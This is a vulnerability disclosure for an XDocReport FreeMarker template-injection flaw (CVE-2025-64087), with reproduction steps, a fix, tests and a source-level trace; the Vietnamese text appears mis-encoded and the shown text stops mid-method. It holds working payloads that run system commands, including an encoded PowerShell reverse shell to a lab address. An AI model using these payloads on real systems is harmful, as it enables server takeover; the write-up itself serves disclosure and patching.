# CVE-2025-64087 (SSTI FreeMarker)

# Server-Side Template Injection (SSTI) in XDocReport allows Remote Code Execution via Apache FreeMarker engine [HIGH]

## Bug Definition

Tá»•ng quan vá» lá»— há»•ng

- Server-Side Template Injection (SSTI) lÃ  má»™t lá»— há»•ng báº£o máº­t web cho phÃ©p táº¥n cÃ´ng chÃ¨n mÃ£ Ä‘á»™c vÃ o cÃ¡c máº«u (templates) Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi cÃ¡c há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) vÃ  cÃ¡c khung (framework) web, nháº±m thá»±c hiá»‡n cÃ¡c cuá»™c táº¥n cÃ´ng tá»« xa, thá»±c hiá»‡n láº¥y thÃ´ng tin nháº¡y cáº£m hoáº·c thá»±c hiá»‡n cÃ¡c hoáº¡t Ä‘á»™ng xÃ¢m nháº­p há»‡ thá»‘ng.

- SSTI lÃ  má»™t biáº¿n thá»ƒ cá»§a lá»— há»•ng Injection (nhÆ° SQL Injection, XSS, v.v.), trong Ä‘Ã³ tin táº·c táº­n dá»¥ng viá»‡c sá»­ dá»¥ng cÃ¡c há»‡ thá»‘ng templates Ä‘á»ƒ triá»ƒn khai mÃ£ Ä‘á»™c tá»« xa. Khi má»™t táº¥n cÃ´ng SSTI Ä‘Æ°á»£c thá»±c hiá»‡n thÃ nh cÃ´ng, tin táº·c cÃ³ thá»ƒ thá»±c thi mÃ£ cá»§a riÃªng mÃ¬nh trÃªn mÃ¡y chá»§ á»Ÿ phÃ­a mÃ¡y chá»§, cho phÃ©p há» thá»±c hiá»‡n cÃ¡c cuá»™c táº¥n cÃ´ng tá»« xa, nhÆ° thu tháº­p thÃ´ng tin nháº¡y cáº£m, thá»±c hiá»‡n cÃ¡c hoáº¡t Ä‘á»™ng xÃ¢m nháº­p há»‡ thá»‘ng, vÃ  truy cáº­p cÃ¡c tÃ i nguyÃªn khÃ´ng Ä‘Æ°á»£c á»§y quyá»n.

- Lá»— há»•ng SSTI thÆ°á»ng xáº£y ra do viá»‡c sá»­ dá»¥ng cÃ¡c há»‡ thá»‘ng templates khÃ´ng an toÃ n, hoáº·c do khÃ´ng kiá»ƒm tra vÃ  xá»­ lÃ½ cÃ¡c tham sá»‘ Ä‘áº§u vÃ o trÆ°á»›c khi chÃ¨n chÃºng vÃ o cÃ¡c máº«u. Náº¿u má»™t táº¥n cÃ´ng SSTI Ä‘Æ°á»£c thá»±c hiá»‡n thÃ nh cÃ´ng, háº­u quáº£ cÃ³ thá»ƒ lÃ  nghiÃªm trá»ng vÃ  gÃ¢y ra tá»•n tháº¥t lá»›n cho tá»• chá»©c bá»‹ táº¥n cÃ´ng.

áº¢nh hÆ°á»Ÿng kinh doanh

- Lá»— há»•ng SSTI cÃ³ thá»ƒ gÃ¢y ra nhiá»u háº­u quáº£ nghiÃªm trá»ng, bao gá»“m:

- Thá»±c thi mÃ£ Ä‘á»™c: Káº» táº¥n cÃ´ng cÃ³ thá»ƒ sá»­ dá»¥ng lá»— há»•ng nÃ y Ä‘á»ƒ thá»±c thi mÃ£ Ä‘á»™c trÃªn mÃ¡y chá»§, cho phÃ©p táº¥n cÃ´ng Ä‘Ã¡nh cáº¯p dá»¯ liá»‡u, thá»±c hiá»‡n cÃ¡c hÃ nh Ä‘á»™ng khÃ´ng há»£p phÃ¡p trÃªn há»‡ thá»‘ng, tháº­m chÃ­ kiá»ƒm soÃ¡t hoÃ n toÃ n mÃ¡y chá»§.

- Tiáº¿t lá»™ thÃ´ng tin nháº¡y cáº£m: SSTI cÃ³ thá»ƒ cho phÃ©p táº¥n cÃ´ng Ä‘á»c, thay Ä‘á»•i hoáº·c xÃ³a cÃ¡c tá»‡p tin trÃªn mÃ¡y chá»§. Náº¿u cÃ¡c tá»‡p tin nÃ y chá»©a thÃ´ng tin nháº¡y cáº£m, nhÆ° tÃ i khoáº£n vÃ  máº­t kháº©u, thÃ¬ káº» táº¥n cÃ´ng cÃ³ thá»ƒ dá»… dÃ ng tiáº¿t lá»™ thÃ´ng tin nÃ y.

- Táº¥n cÃ´ng Ä‘e dá»a hoáº·c lá»«a Ä‘áº£o ngÆ°á»i dÃ¹ng: Káº» táº¥n cÃ´ng cÃ³ thá»ƒ sá»­ dá»¥ng SSTI Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c táº¥n cÃ´ng Ä‘e dá»a hoáº·c lá»«a Ä‘áº£o ngÆ°á»i dÃ¹ng, báº±ng cÃ¡ch thay Ä‘á»•i ná»™i dung cá»§a trang web hoáº·c thÃªm cÃ¡c nÃºt tÃ¹y chá»‰nh giáº£ máº¡o. Náº¿u ngÆ°á»i dÃ¹ng báº¥m vÃ o cÃ¡c nÃºt nÃ y, káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘Ã¡nh cáº¯p thÃ´ng tin ngÆ°á»i dÃ¹ng hoáº·c cÃ i Ä‘áº·t pháº§n má»m Ä‘á»™c háº¡i trÃªn mÃ¡y tÃ­nh cá»§a há».

## Severity HIGH

![image](https://hackmd.io/_uploads/SJMMU5EReg.png)

## Description and Impact

A Server-Side Template Injection (SSTI) vulnerability was found in OpenSAGRES XDocReport when processing DOCX templates with the FreeMarker engine. Under certain configurations, crafted templates can lead to Remote Code Execution (RCE).

Trang web quáº£n lÃ½ nhÃ¢n sá»± cho phÃ©p ngÆ°á»i dÃ¹ng upload tá»‡p tÃ i liá»‡u `.docx` lÃªn há»‡ thá»‘ng. Trong quÃ¡ trÃ¬nh xá»­ lÃ½, á»©ng dá»¥ng sá»­ dá»¥ng template engine FreeMarker (táº¡i file FreemarkerTemplateEngine.java) Ä‘á»ƒ render ná»™i dung `${"freemarker.template.utility.Execute"?new()("whoami")}` mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ kiá»ƒm soÃ¡t hoáº·c lá»c ná»™i dung Ä‘áº§u vÃ o.
Lá»— há»•ng nÃ y cho phÃ©p attacker chÃ¨n cÃ¡c biá»ƒu thá»©c Ä‘á»™c háº¡i vÃ o file .docx (template), dáº«n Ä‘áº¿n Remote Code Execution (RCE) trÃªn mÃ¡y chá»§ vÃ  cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ Ä‘Ã¡nh cáº¯p thÃ´ng tin hoáº·c chiáº¿m quyá»n Ä‘iá»u khiá»ƒn há»‡ thá»‘ng.
![image](https://hackmd.io/_uploads/B1JJJ5E0el.png)

## Affected component

fr.opensagres.xdocreport.template.freemarker â€” XDocReport (versions 1.0.0 through 2.1.0).

## Root cause analysis

- táº¡i file `https://github.com/opensagres/xdocreport/blob/master/template/fr.opensagres.xdocreport.template.freemarker/src/main/java/fr/opensagres/xdocreport/template/freemarker/FreemarkerTemplateEngine.java` khÃ´ng thá»±c hiá»‡n kiá»ƒm tra ná»™i dung cá»§a file xdoc Ä‘áº§u vÃ o.Ná»™i dung template Ä‘Æ°á»£c náº¡p tháº³ng vÃ  chuyá»ƒn vÃ o process(context, writer, template) Ä‘á»ƒ xá»­ lÃ½ bá»Ÿi engine FreeMarker mÃ  khÃ´ng cÃ³ cÆ¡ cháº¿ sandboxing hoáº·c háº¡n cháº¿ directive/biá»ƒu thá»©c. Káº¿t quáº£ lÃ  attacker cÃ³ thá»ƒ cung cáº¥p template chá»©a biá»ƒu thá»©c/dÃ²ng lá»‡nh FreeMarker Ä‘á»™c háº¡i, dáº«n Ä‘áº¿n thá»±c thi mÃ£ tá»« xa (RCE).

![image](https://hackmd.io/_uploads/BJln3YE0lg.png)

## Step to reproduce

1. NgÆ°á»i dÃ¹ng thá»±c hiá»‡n upload file `.docx` cÃ³ ná»™i dung bÃªn trong lÃ  payload sau:

```
${"freemarker.template.utility.Execute"?new()("calc")}
```

![image](https://hackmd.io/_uploads/SJ7CPIz0xg.png)

2. Tháº¥y cÃ³ thá»ƒ thá»±c thi thÃ nh cÃ´ng vÃ  má»Ÿ á»©ng dá»¥ng calc

![image](https://hackmd.io/_uploads/BkaIvIMRle.png)

3. TÆ°Æ¡ng tá»± Ä‘á»ƒ láº¥y thÃ´ng tin ngÆ°á»i dÃ¹ng Ä‘ang cháº¡y trÃªn há»‡ thá»‘ng vá»›i payload:

```
${"freemarker.template.utility.Execute"?new()("whoami")}
```

![image](https://hackmd.io/_uploads/SyRbsFzCxe.png)

![image](https://hackmd.io/_uploads/ryImsFGAgg.png)

4. CÃ³ thá»ƒ tháº¥y file `.docx` qua xá»­ lÃ½ cá»§a template engine Ä‘Ã£ tráº£ ra dá»¯ liá»‡u cá»§a há»‡ thá»‘ng

![image](https://hackmd.io/_uploads/SyeNsKfRex.png)

5. TÆ°Æ¡ng tá»± vá»›i payload sau:

```
${"freemarker.template.utility.Execute"?new()("cmd /c dir d:")}
```

![image](https://hackmd.io/_uploads/HyS5SgU0eg.png)

![image](https://hackmd.io/_uploads/Bk13HeLAll.png)

![image](https://hackmd.io/_uploads/r1yiHlIAel.png)

6. NÃ¢ng impact lÃªn RCE

- MÃ¡y láº¯ng nghe lÃ  wsl cÃ³ Ä‘á»‹a chá»‰ ip lÃ  `172.26.208.130`

![image](https://hackmd.io/_uploads/SkYCol8Cel.png)

- khai thÃ¡c vá»›i payload sau:

![image](https://hackmd.io/_uploads/HksplZUAeg.png)

```java
${"freemarker.template.utility.Execute"?new()("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAyADYALgAyADAAOAAuADEAMwAwACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==")}
```

![image](https://hackmd.io/_uploads/H10-3x8Rxe.png)

- Cho file `.docx` qua xdocreport xá»­ lÃ½

![image](https://hackmd.io/_uploads/SkAI3lLAxe.png)

- Tháº¥y báº¯t Ä‘Æ°á»£c shell tráº£ vá» táº¡i mÃ¡y wsl

![image](https://hackmd.io/_uploads/BycRhxUAel.png)

## Solution

### CHáº·n thá»±c thi reflection (an toÃ n nháº¥t nhÆ°ng Ä‘ang build lá»—i)

- táº¡i file `xdocreport\template\fr.opensagres.xdocreport.template.freemarker\src\main\java\fr\opensagres\xdocreport\template\freemarker\FreemarkerTemplateEngine.java` thÃªm cÃ¡c ná»™i dung sau

![image](https://hackmd.io/_uploads/H1uAaYzRxl.png)

![image](https://hackmd.io/_uploads/BkgyAKfAxe.png)

CÃ¡ch fix cá»§a tÃ´i váº«n cho phÃ©p render object vÃ  properties bÃ¬nh thÆ°á»ng nhÆ° `${cuong.name}` vÃ  chá»‰ cháº·n cÃ¡c built-in functions NGUY HIá»‚M

- **Táº¥t cáº£ payload SSTI Ä‘á»u bá»‹ cháº·n**:
  - `${'freemarker.template.utility.Execute'?new()('calc')}` - **Bá»Š CHáº¶N** bá»Ÿi `ALLOWS_NOTHING_RESOLVER`
  - `${'java.lang.Runtime'?api.getRuntime()}` - **Bá»Š CHáº¶N** bá»Ÿi `setAPIBuiltinEnabled(false)`
  - Táº¥t cáº£ cÃ¡c payload khÃ¡c sá»­ dá»¥ng `?new()` vÃ  `?api` Ä‘á»u bá»‹ cháº·n

### validate input

#### **1. Main File - FreemarkerTemplateEngine.java**

**Path:** `template/fr.opensagres.xdocreport.template.freemarker/src/main/java/fr/opensagres/xdocreport/template/freemarker/FreemarkerTemplateEngine.java`

**Changes:**

- âœ… **Added import:** `java.util.regex.Pattern`  
  ![image](https://hackmd.io/_uploads/HyU01Qv0xx.png)

- âœ… **Added method `validateTemplateSecurity(Reader reader)`** â€” Validates dangerous patterns  
  ![image](https://hackmd.io/_uploads/S1QyeQPRxg.png)

- âœ… **Updated `processNoCache()`** â€” Added validation before creating the Template  
  ![image](https://hackmd.io/_uploads/B1wfg7wCex.png)

- âœ… **Updated `process(String templateName, â€¦)`** â€” Added validation to this method  
  ![image](https://hackmd.io/_uploads/Hk1VlmwRxg.png)

#### **2. Test File - FreemarkerTemplateEngineSecurityTestCase.java**

**Path:** `template/fr.opensagres.xdocreport.template.freemarker/src/test/java/fr/opensagres/xdocreport/template/freemarker/FreemarkerTemplateEngineSecurityTestCase.java`

**Changes:**

- âœ… **Created new test case** â€” Tests common SSTI payloads
- âœ… **Main payload tested:** `${"freemarker.template.utility.Execute"?new()("whoami")}`
- âœ… **Additional patterns tested:** `?new`, `java.lang.Runtime`, `java.lang.ProcessBuilder`, etc.
- âœ… **Safe template test** â€” Ensures normal templates still work properly

#### **Summary of Changes**

| File                                              | Type of Change | Purpose                |
| ------------------------------------------------- | -------------- | ---------------------- |
| **FreemarkerTemplateEngine.java**                 | **Modified**   | Added SSTI protection  |
| **FreemarkerTemplateEngineSecurityTestCase.java** | **New File**   | Tests validation logic |

### Fix cuá»‘i cÃ¹ng

- https://github.com/opensagres/xdocreport/pull/705

![image](https://hackmd.io/_uploads/SyZDfgl--g.png)

![image](https://hackmd.io/_uploads/BySYMxgZWg.png)

## References

- https://portswigger.net/web-security/server-side-template-injection

## Thiáº¿t láº­p mÃ´i trÆ°á»ng debug

![image](https://hackmd.io/_uploads/HkUB2FG0xe.png)

- táº¡i file Main.java

```java
package org.example;

import fr.opensagres.xdocreport.document.IXDocReport;
import fr.opensagres.xdocreport.document.registry.XDocReportRegistry;
import fr.opensagres.xdocreport.template.IContext;
import fr.opensagres.xdocreport.template.TemplateEngineKind;

import java.io.*;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class Main {

    public static void main(String[] args) {
        try {
            // Äá»c file Ä‘áº§u vÃ o chá»©a biá»ƒu thá»©c Velocity
            File docxTemplate = new File("C:\\Users\\HP\\Downloads\\vcspentest.docx"); // File Ä‘áº§u vÃ o
            InputStream input = new FileInputStream(docxTemplate);

            // Load template sá»­ dá»¥ng FreeMarker
            IXDocReport report = XDocReportRegistry.getRegistry().loadReport(input, TemplateEngineKind.Freemarker);

            // Táº¡o context - cÃ³ thá»ƒ Ä‘á»ƒ trá»‘ng náº¿u chá»‰ test biá»ƒu thá»©c Ä‘á»™c láº­p
            IContext context = report.createContext();

            // Xuáº¥t ra file má»›i
            OutputStream out = new FileOutputStream(new File("C:\\Users\\HP\\Downloads\\results.docx"));
            report.process(context, out);

            System.out.println("âœ… ÄÃ£ táº¡o file result.docx thÃ nh cÃ´ng.");
        } catch (Exception e) {
            System.err.println("âŒ Lá»—i xá»­ lÃ½ file:");
            e.printStackTrace();
        }
    }
}
```

- ThÆ° viá»‡n cáº§n import

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>vcs1</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>18</maven.compiler.source>
        <maven.compiler.target>18</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <!-- Template engine: FreeMarker -->
        <dependency>
            <groupId>fr.opensagres.xdocreport</groupId>
            <artifactId>fr.opensagres.xdocreport.template.freemarker</artifactId>
            <version>2.1.0</version>
        </dependency>

        <dependency>
            <groupId>fr.opensagres.xdocreport</groupId>
            <artifactId>fr.opensagres.xdocreport.document.docx</artifactId>
            <version>2.0.3</version>
        </dependency>
    </dependencies>
</project>
```

A
Äiá»ƒm báº¯t Ä‘áº§u (entry points / sources)

```java
File docxTemplate = new File("C:\\Users\\HP\\Downloads\\vcspentest.docx");
```

â†’ source chÃ­nh lÃ  file DOCX nÃ y â€” náº¿u file Ä‘Æ°á»£c ngÆ°á»i dÃ¹ng upload/ghi, ná»™i dung template bÃªn trong (FreeMarker syntax) lÃ  dá»¯ liá»‡u khÃ´ng tin cáº­y.

```
InputStream input = new FileInputStream(docxTemplate);
```

â†’ Ä‘á»c ná»™i dung file Ä‘á»ƒ chuyá»ƒn tiáº¿p cho XDocReport.

```java
IXDocReport report = XDocReportRegistry.getRegistry().loadReport(input, TemplateEngineKind.Freemarker);
```

- loadReport(...) sáº½ phÃ¢n tÃ­ch (parse) file DOCX, tÃ¬m entry/template trong DOCX vÃ  táº¡o má»™t IXDocReport (bÃªn trong nÃ³ sáº½ khá»Ÿi táº¡o Template object cá»§a FreeMarker hoáº·c giá»¯ reader cho template).

- Ná»™i dung template trong file DOCX giá» Ä‘Ã£ náº±m trong Ä‘á»‘i tÆ°á»£ng report (váº«n chÆ°a thá»±c thi).

![image](https://hackmd.io/_uploads/B1iFlSzAel.png)

![image](https://hackmd.io/_uploads/S1NkWBf0ee.png)

zipInputStream.getNextEntry() láº·p qua tá»«ng entry (má»—i file) bÃªn trong ZIP (.docx).

archive = new XDocArchive(...) â€” náº¿u chÆ°a cÃ³ archive thÃ¬ khá»Ÿi táº¡o 1 Ä‘á»‘i tÆ°á»£ng Ä‘á»ƒ tá»• chá»©c/Ä‘Äƒng kÃ½ cÃ¡c entry cá»§a tÃ i liá»‡u.

![image](https://hackmd.io/_uploads/HkiIWSfAel.png)

TÃ³m láº¡i: Ä‘oáº¡n nÃ y giáº£i nÃ©n ná»™i dung DOCX vÃ o má»™t cáº¥u trÃºc ná»™i bá»™ (XDocArchive) Ä‘á»ƒ pháº§n sau cÃ³ thá»ƒ truy xuáº¥t cÃ¡c file con (document.xml,...)

```java
private IXDocReport loadReport( InputStream sourceStream, String reportId, String templateEngineKind,
                                    ITemplateEngine templateEngine, boolean cacheReport )
        throws IOException, XDocReportException
    {
        initializeIfNeeded();
        // 2) zip was loaded, create an instance of report
        IXDocReport report = createReport( sourceStream );
        // 3) Update the report id if need.
        if ( StringUtils.isEmpty( reportId ) )
        {
            reportId = report.toString();
        }
        report.setId( reportId );
        // 4) Search or set the template engine.
        if ( templateEngine == null && StringUtils.isNotEmpty( templateEngineKind ) )
        {
            // Template engine was not forced.
            // Search template engine
            String documentKind = report.getKind();
            templateEngine =
                TemplateEngineInitializerRegistry.getRegistry().getTemplateEngine( templateEngineKind, documentKind );
            if ( templateEngine == null )
            {
                templateEngine =
                    TemplateEngineInitializerRegistry.getRegistry().getTemplateEngine( templateEngineKind, null );
            }
        }
        report.setTemplateEngine( templateEngine );
        if ( cacheReport )
        {
            registerReport( report );
        }
        return report;
    }
```

| BÆ°á»›c | HÃ nh Ä‘á»™ng            | Má»¥c Ä‘Ã­ch                                 |
| ---- | -------------------- | ---------------------------------------- |
| 1    | Äá»c file DOCX        | Láº¥y cáº¥u trÃºc bÃ¡o cÃ¡o gá»‘c                 |
| 2    | Táº¡o `IXDocReport`    | Äáº¡i diá»‡n cho template                    |
| 3    | GÃ¡n ID               | Quáº£n lÃ½ duy nháº¥t                         |
| 4    | Chá»n template engine | Äá»ƒ xá»­ lÃ½ biá»ƒu thá»©c (Freemarker/Velocity) |
| 5    | Cache náº¿u cáº§n        | Tá»‘i Æ°u hiá»‡u suáº¥t                         |
| 6    | Tráº£ vá» report        | DÃ¹ng Ä‘á»ƒ render file káº¿t quáº£              |

![image](https://hackmd.io/_uploads/B1YuErzAxg.png)

TÃ³m láº¡i khÃ´ng cÃ³ cÆ¡ cháº¿ kiá»ƒm tra SSTI táº¡i `IXDocReport report = XDocReportRegistry.getRegistry().loadReport(input, TemplateEngineKind.Freemarker);` mÃ  chá»‰ load cÃ¡c file xml trong docx vÃ  tráº£ vá» `IXDocReport report` Ä‘Ã£ sáºµn sÃ ng Ä‘á»ƒ xá»­ lÃ½ (vÃ­ dá»¥ render, merge dá»¯ liá»‡uâ€¦).

![image](https://hackmd.io/_uploads/HJp_HBf0eg.png)

táº¡i `report.process(context, out);`

![image](https://hackmd.io/_uploads/SkOO64M0gg.png)

- ÄÃ¢y lÃ  Ä‘iá»ƒm kÃ­ch hoáº¡t (sink thá»±c thi): XDocReport sáº½ gá»i engine tÆ°Æ¡ng á»©ng (á»Ÿ Ä‘Ã¢y lÃ  FreeMarker) Ä‘á»ƒ merge template vá»›i context vÃ  render káº¿t quáº£ ra out.
- PhÆ°Æ¡ng thá»©c nÃ y láº¥y template tÃ i liá»‡u (vÃ­ dá»¥ .docx hoáº·c .odt) Ä‘Ã£ Ä‘Æ°á»£c náº¡p trÆ°á»›c Ä‘Ã³,
  rá»“i nhÃºng dá»¯ liá»‡u tá»« Ä‘á»‘i tÆ°á»£ng context (thÆ°á»ng lÃ  IContext) vÃ o cÃ¡c biáº¿n trong template.
- Sau Ä‘Ã³ nÃ³ render ra tÃ i liá»‡u hoÃ n chá»‰nh (vá»›i dá»¯ liá»‡u thá»±c) vÃ  ghi káº¿t quáº£ ra stream out, tá»©c lÃ  ra file results.docx.

Ä‘i sÃ¢u vÃ o bÃªn trong hÃ m nÃ y cÃ³ gá»i Ä‘áº¿n `preprocess(...)` phÃ¢n tÃ­ch XML Ä‘á»c tá»«ng entry XML, sau Ä‘Ã³ Parse ná»™i dung XML vÃ  táº¡o BufferedDocument rá»“i ghi ra Writer (Ä‘Ã¢y lÃ  báº£n XML Ä‘Ã£ Ä‘Æ°á»£c xá»­ lÃ½ sÆ¡ bá»™).

![image](https://hackmd.io/_uploads/HJcywBzRxl.png)

```java
public boolean preprocess( String entryName, InputStream reader, Writer writer, FieldsMetadata fieldsMetadata,
                               IDocumentFormatter formatter, Map<String, Object> sharedContext )
        throws XDocReportException, IOException
    {
        try
        {
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            BufferedDocumentContentHandler<?> contentHandler =
                createBufferedDocumentContentHandler( entryName, fieldsMetadata, formatter, sharedContext );
            xmlReader.setContentHandler( contentHandler );
            xmlReader.parse( new InputSource( reader ) );
            BufferedDocument document = contentHandler.getBufferedDocument();
            if ( document != null )
            {
                document.save( writer );
//                 StringWriter s = new StringWriter();
//                 document.save( s );
//                 System.err.println( s );
                return true;
            }

            return false;
        }
        catch ( SAXException e )
        {
            throw new XDocReportException( e );
        }
    }
```

![image](https://hackmd.io/_uploads/BJsDqHzRge.png)

sau Ä‘Ã³ nÃ³ nháº£y vÃ o `processNoCache()` vÃ  gá»i `getReader()`
![image](https://hackmd.io/_uploads/r1gpirG0el.png)

![image](https://hackmd.io/_uploads/H1xE3rfCxl.png)

HÃ m `getReader()` dÃ¹ng Ä‘á»ƒ thÃªm bao escape directive quanh toÃ n bá»™ template, nháº±m báº£o Ä‘áº£m ná»™i dung Ä‘Æ°á»£c xá»­ lÃ½ an toÃ n (escape HTML, trÃ¡nh injection).

![image](https://hackmd.io/_uploads/HyM8pHzCxe.png)

Template gá»‘c:

```xml
<w:p>
  <w:t>Hello ${name}!</w:t>
</w:p>
```

Sau khi getReader() xá»­ lÃ½:

```xml
[#--<![CDATA[[#escape any as any?xml]
<w:p>
  <w:t>Hello ${name}!</w:t>
</w:p>
[/#escape][#--]]>--]
```

nÃ³ giÃºp Freemarker engine Ä‘á»c Ä‘Æ°á»£c an toÃ n hÆ¡n:

- Báº£o vá»‡ XML: Escape cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t trong XML
- Xá»­ lÃ½ an toÃ n: TrÃ¡nh lá»—i khi Freemarker parse template

sau Ä‘Ã³ gá»i `FMParser` Ä‘á»ƒ phÃ¢n tÃ­ch cÃº phÃ¡p Freemarker

![image](https://hackmd.io/_uploads/SJwnxLfCgg.png)

cuá»‘i cÃ¹ng vÃ o `process()` gá»i `environment.process();` vÃ  reader dá»¯ liá»‡u

```
public void process() throws TemplateException, IOException {
        Object savedEnv = threadEnv.get();
        threadEnv.set(this);
        try {
            // Cached values from a previous execution are possibly outdated.
            clearCachedValues();
            try {
                doAutoImportsAndIncludes(this);
                visit(getTemplate().getRootTreeNode());
                // It's here as we must not flush if there was an exception.
                if (getAutoFlush()) {
                    out.flush();
                }
            } finally {
                // It's just to allow the GC to free memory...
                clearCachedValues();
            }
        } finally {
            threadEnv.set(savedEnv);
        }
    }
```

ğŸ‘‰ ÄÃ¢y lÃ  bÆ°á»›c quan trá»ng nháº¥t â€” pháº§n render thá»±c sá»± xáº£y ra.

- getTemplate() tráº£ vá» template Ä‘Ã£ parse (AST).

- getRootTreeNode() lÃ  nÃºt gá»‘c cá»§a cÃ¢y cÃº phÃ¡p Ä‘Æ°á»£c FMParser táº¡o ra lÃºc parse.

- visit() lÃ  API lÃµi cá»§a FreeMarker, dÃ¹ng Ä‘á»ƒ duyá»‡t vÃ  render tá»«ng pháº§n tá»­ cá»§a template, vÃ  Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a trong freemarker.core.Environment

  - Gáº·p TextBlock â†’ ghi text ra out.

  - Gáº·p Interpolation (vÃ­ dá»¥ `${user.name}`) â†’ tra trong dataModel, láº¥y giÃ¡ trá»‹, ghi ra out.

  - Gáº·p #if, #list, #include, macro â†’ xá»­ lÃ½ logic tÆ°Æ¡ng á»©ng

```java
void visit(TemplateElement element) throws IOException, TemplateException {
        // ATTENTION: This method body is manually "inlined" into visit(TemplateElement[]); keep them in sync!
        pushElement(element);
        try {
            TemplateElement[] templateElementsToVisit = element.accept(this);
            if (templateElementsToVisit != null) {
                for (TemplateElement el : templateElementsToVisit) {
                    if (el == null) {
                        break;  // Skip unused trailing buffer capacity
                    }
                    visit(el);
                }
            }
        } catch (TemplateException te) {
            handleTemplateException(te);
        } finally {
            popElement();
        }
        // ATTENTION: This method body above is manually "inlined" into visit(TemplateElement[]); keep them in sync!
    }
```

![image](https://hackmd.io/_uploads/BJMLCQX0ee.png)

![image](https://hackmd.io/_uploads/SyDi57mAgg.png)

![image](https://hackmd.io/_uploads/SJ6Wo7XRel.png)

nÃ³ trigger táº¡i entryName `word/document.xml`

![image](https://hackmd.io/_uploads/H1axTmmAgx.png)

tiáº¿p theo nháº£y vÃ o hÃ m `accept()`

![image](https://hackmd.io/_uploads/B1A92I7Rgl.png)

```java
    TemplateElement[] accept(Environment env) throws TemplateException, IOException {
        final Object moOrStr = calculateInterpolatedStringOrMarkup(env);
        final Writer out = env.getOut();
        if (moOrStr instanceof String) {
            final String s = (String) moOrStr;
            if (autoEscape) {
                markupOutputFormat.output(s, out);
            } else {
                out.write(s);
            }
        } else {
            final TemplateMarkupOutputModel mo = (TemplateMarkupOutputModel) moOrStr;
            final MarkupOutputFormat moOF = mo.getOutputFormat();
            // ATTENTION: Keep this logic in sync. ?esc/?noEsc's logic!
            if (moOF == outputFormat) {
                moOF.output(mo, out);
            } else if (!outputFormat.isOutputFormatMixingAllowed()) {
                final String srcPlainText;
                // ATTENTION: Keep this logic in sync. ?esc/?noEsc's logic!
                srcPlainText = moOF.getSourcePlainText(mo);
                if (srcPlainText == null) {
                    throw new _TemplateModelException(escapedExpression,
                            "The value to print is in ", new _DelayedToString(moOF),
                            " format, which differs from the current output format, ",
                            new _DelayedToString(outputFormat), ". Format conversion wasn't possible.");
                }
                if (markupOutputFormat != null) {
                    markupOutputFormat.output(srcPlainText, out);
                } else {
                    out.write(srcPlainText);
                }
            } else if (markupOutputFormat != null) {
                markupOutputFormat.outputForeign(mo, out);
            } else {
                moOF.output(mo, out);
            }
        }
        return null;
    }
```

![image](https://hackmd.io/_uploads/ryiU0I7Clx.png)

```java
    final TemplateModel eval(Environment env) throws TemplateException {
        try {
            return constantValue != null ? constantValue : _eval(env);
        } catch (FlowControlException | TemplateException e) {
            throw e;
        } catch (Exception e) {
            if (env != null && EvalUtil.shouldWrapUncheckedException(e, env)) {
                throw new _MiscTemplateException(
